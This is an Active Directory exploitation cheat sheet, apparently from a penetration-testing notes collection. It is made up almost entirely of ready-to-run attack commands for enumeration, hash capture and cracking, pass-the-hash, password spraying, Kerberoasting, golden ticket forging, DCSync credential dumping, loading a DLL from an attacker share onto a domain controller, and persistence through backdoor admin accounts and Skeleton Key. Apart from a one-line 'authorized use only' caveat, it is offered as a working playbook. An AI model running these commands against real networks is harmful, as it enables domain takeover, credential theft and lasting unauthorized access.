# Active Directory Exploitation Cheat Sheet

A practical reference for AD attack techniques — enumeration, credential attacks, Kerberos abuse, lateral movement, and persistence. Based on the S1ckB0y1337 AD cheat sheet and expanded with operational context.

- **Primary Reference:** https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet

> For authorized penetration testing and red team operations only.

---

## Table of Contents
1. [AD Fundamentals](#1-ad-fundamentals)
2. [Initial Enumeration](#2-initial-enumeration)
3. [Credential Attacks](#3-credential-attacks)
4. [Kerberos Attacks](#4-kerberos-attacks)
5. [Lateral Movement](#5-lateral-movement)
6. [Domain Privilege Escalation](#6-domain-privilege-escalation)
7. [Persistence](#7-persistence)
8. [Domain Trusts](#8-domain-trusts)
9. [Tools Reference](#9-tools-reference)

---

## 1. AD Fundamentals

```
Forest → Domains → OUs → Objects (users, computers, groups, GPOs)

Key services:
  DC (Domain Controller): Stores NTDS.dit, handles auth
  LDAP 389/636:  Directory queries
  Kerberos 88:   Ticket-based authentication (primary)
  SMB 445:       File shares, RPC, lateral movement
  DNS 53:        Critical for AD name resolution

Key groups:
  Domain Admins:       Full control of domain
  Enterprise Admins:   Full control of forest (only in root domain)
  DNSAdmins:           Can load DLL into DNS service on DC → SYSTEM
  Schema Admins:       Modify AD schema
```

---

## 2. Initial Enumeration

### Unauthenticated

```bash
# SMB null session
rpcclient -U "" DC_IP -N -c "enumdomusers"

# LDAP anonymous bind
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local" "(objectClass=user)" cn

# Username enumeration via Kerberos (no lockout)
kerbrute userenum --dc DC_IP -d domain.local userlist.txt

# DNS enumeration
dig @DC_IP _ldap._tcp.dc._msdcs.domain.local SRV
```

### Authenticated

```powershell
# PowerShell AD module
Get-ADUser -Filter * -Properties MemberOf,LastLogonDate
Get-ADGroupMember "Domain Admins" -Recursive
Get-ADComputer -Filter * | Select Name, DNSHostName

# Find Kerberoastable accounts (have SPNs)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Find unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# Find AS-REP roastable (no pre-auth)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
```

### BloodHound

```bash
# Collect (Linux, no agent)
bloodhound-python -u user -p 'Password' -d domain.local -ns DC_IP -c All

# Collect (Windows)
.\SharpHound.exe -c All --outputdirectory C:\temp\

# Import ZIP to BloodHound, then run:
# "Find Shortest Path to Domain Admins"
# "Find Principals with DCSync Rights"
# "Computers where DA are Logged In"
```

---

## 3. Credential Attacks

```bash
# LLMNR/NBT-NS poisoning — capture NTLMv2 hashes
sudo responder -I eth0 -wFb

# Crack captured NTLMv2
hashcat -m 5600 hashes.txt rockyou.txt --rules-file best64.rule

# Pass-the-Hash
crackmapexec smb TARGET -u Administrator -H 'NTLM_HASH'
evil-winrm -i TARGET -u USER -H 'NTLM_HASH'

# Password spray (1 attempt per 30 min to avoid lockout)
crackmapexec smb DC_IP -u users.txt -p 'Password1!' --continue-on-success
kerbrute passwordspray --dc DC_IP -d domain.local users.txt 'Password1!'
```

---

## 4. Kerberos Attacks

### Kerberoasting

```bash
# Get TGS for accounts with SPNs → crack offline
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request \
  -outputfile hashes.txt
hashcat -m 13100 hashes.txt rockyou.txt

# Windows (Rubeus)
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

### AS-REPRoasting

```bash
# Get AS-REP for accounts with no pre-auth required → crack offline
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip DC_IP \
  -no-pass -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

### Golden Ticket

```bash
# Requires KRBTGT hash (from DCSync)
lsadump::dcsync /domain:domain.local /user:krbtgt  # Mimikatz

# Forge TGT for any user
kerberos::golden /user:Administrator /domain:domain.local \
  /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /id:500
kerberos::ptt ticket.kirbi
```

### Pass-the-Ticket

```bash
# Dump tickets from memory
.\Rubeus.exe dump /nowrap
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Mimikatz
sekurlsa::tickets /export
kerberos::ptt ticket.kirbi
```

---

## 5. Lateral Movement

```bash
# CrackMapExec — SMB / WinRM
crackmapexec smb TARGET -u USER -p 'PASS' -x "whoami"
crackmapexec winrm TARGET -u USER -p 'PASS' -x "whoami"

# Evil-WinRM (interactive shell)
evil-winrm -i TARGET -u USER -p 'PASS'

# impacket tools
impacket-psexec domain/user:pass@TARGET      # SMB + named pipe (noisy)
impacket-wmiexec domain/user:pass@TARGET     # WMI (quieter)
impacket-smbexec domain/user:pass@TARGET
```

---

## 6. Domain Privilege Escalation

### DCSync

```bash
# Requires Replication rights (DA, or manually added)
impacket-secretsdump domain.local/DomainAdmin:pass@DC_IP
# Mimikatz
lsadump::dcsync /domain:domain.local /all /csv
```

### DNSAdmins → SYSTEM on DC

```cmd
dnscmd DC_IP /config /serverlevelplugindll \\attacker\share\evil.dll
sc \\DC_IP stop dns
sc \\DC_IP start dns
# DLL executes as SYSTEM on the DC
```

### LAPS Password Theft

```powershell
# If you have read rights to ms-Mcs-AdmPwd attribute
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select Name, ms-Mcs-AdmPwd
```

---

## 7. Persistence

```powershell
# New DA user
net user backdoor P@ss1! /add /domain
net group "Domain Admins" backdoor /add /domain

# DCSync rights for own account
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" `
  -PrincipalIdentity backdoor -Rights DCSync

# Skeleton Key (patches LSASS on DC, reboot clears it)
# Mimikatz: misc::skeleton
# All accounts now also accept password "mimikatz"

# AdminSDHolder — write ACE to propagate to all protected groups every 60 min
```

---

## 8. Domain Trusts

```bash
# Enumerate
Get-ADTrust -Filter *
nltest /domain_trusts /all_trusts

# Child → Parent domain escalation (ExtraSids)
# Inject Enterprise Admins SID (PARENT_SID-519) into Golden Ticket
kerberos::golden /user:EA /domain:child.domain.local \
  /sid:CHILD_SID /krbtgt:CHILD_KRBTGT /sids:PARENT_SID-519 /ptt
```

---

## 9. Tools Reference

| Tool | Purpose | Link |
|------|---------|------|
| **BloodHound** | AD attack path analysis | github.com/BloodHoundAD/BloodHound |
| **Mimikatz** | Credential dump, ticket ops | github.com/gentilkiwi/mimikatz |
| **Rubeus** | Kerberos ticket manipulation | github.com/GhostPack/Rubeus |
| **CrackMapExec** | SMB/WinRM lateral movement | github.com/byt3bl33d3r/CrackMapExec |
| **Evil-WinRM** | WinRM shell | github.com/Hackplayers/evil-winrm |
| **impacket** | Python AD/SMB/Kerberos | github.com/SecureAuthCorp/impacket |
| **Responder** | Hash capture via poisoning | github.com/lgandx/Responder |
| **kerbrute** | Username enum, spray | github.com/ropnop/kerbrute |
| **PowerView** | PowerShell AD enumeration | PowerShellMafia/PowerSploit |

---

## See Also

- [Offensive Frameworks](offensive-frameworks.md) — WinPwn, AutoSploit
- [Exploit Development](exploit-development.md) — Windows kernel exploitation
- [Penetration Testing Tools](penetration-testing-tools.md) — Metasploit, Hashcat
